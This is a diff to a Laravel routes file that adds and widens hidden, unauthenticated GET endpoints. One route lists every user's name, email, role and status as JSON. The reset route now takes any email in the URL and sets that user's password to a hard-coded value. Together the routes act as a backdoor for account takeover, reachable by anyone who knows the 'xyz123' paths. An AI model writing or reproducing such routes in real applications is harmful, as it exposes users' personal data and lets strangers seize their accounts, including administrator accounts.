@@ -13,14 +13,19 @@ Route::get('/', function () {
     return view('welcome');
 });
 
-Route::get('/reset-admin-password-xyz123', function () {
-    $user = User::where('email', 'admin@cbo.com')->first();
+Route::get('/list-users-xyz123', function () {
+    $users = User::all(['id', 'name', 'email', 'role', 'status']);
+    return response()->json($users);
+});
+
+Route::get('/reset-admin-password-xyz123/{email}', function ($email) {
+    $user = User::where('email', $email)->first();
     if (!$user) {
         return 'User not found';
     }
     $user->password = Hash::make('admin@2026');
     $user->save();
-    return 'Password reset successfully';
+    return 'Password reset successfully for ' . $email;
 });
 
 Route::get('/dashboard', [MemberDashboardController::class, 'index'])
